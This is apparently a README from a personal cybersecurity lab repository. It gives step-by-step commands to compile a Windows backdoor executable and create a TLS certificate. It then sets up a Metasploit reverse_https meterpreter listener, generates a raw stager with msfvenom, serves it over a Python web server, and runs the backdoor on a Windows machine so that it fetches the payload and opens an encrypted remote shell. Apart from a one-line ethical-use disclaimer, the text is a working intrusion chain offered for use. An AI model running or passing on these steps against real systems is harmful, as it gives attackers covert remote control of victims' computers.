# Cyber Security
Cyber Security Lab Experiences by Fabio Felgueiras

Use this for ethical hacking only 

In this example we will use a Kali Linux 2023.2 and windows 10

In Kali >

1- Download

    git clone https://github.com/Blive77/cybersecurity/
    cd cybersecurity
    
2- Compile

    x86_64-w64-mingw32-g++ --static -o backDoorTest.exe backdoor.cpp -fpermissive -lws2_32
    
    
3- Create custom SSL/TLS certificate 
    https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-paranoid-mode.html

    openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" \
    -keyout www.example.com.key \
    -out www.example.com.crt && \
    cat www.example.com.key  www.example.com.crt > www.example.com.pem && \
    rm -f www.example.com.key  www.example.com.crt
    
      
4- Config the msfconsole Listner

    msfconsole
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_https
    set LHOST 0.0.0.0
    set LPORT 3333
    set HandlerSSLCert www.example.com.pem
    set StagerVerifySSLCert true
    set HandlerSSLCert /home/kali/cybersecurity/www.example.com.pem
    exploit
   
    
5- Create the Payload with msfvenom in Kali linux

   In my case:
   - Host IP= 192.168.235.132  
   - Host Port= 3333
   - Path To cert file= /home/kali/cybersecurity/www.example.com.pem
      
    msfvenom -p windows/x64/meterpreter/reverse_https lhost=(Host IP) lport=(Host Port) HandlerSSLCert=(Path To cert file) StagerVerifySSLCert=true -f raw > load.bin
    
   
6- Setup the http webserver for Payload download (while in cybersecurity folder)

    python -m http.server
    
In Windows >
    
1- Execute the File created in point (2) backDoorTest.exe
    
    backDoorTest.exe ( can be execute with paramters IP, Port and PayLoad File )
 
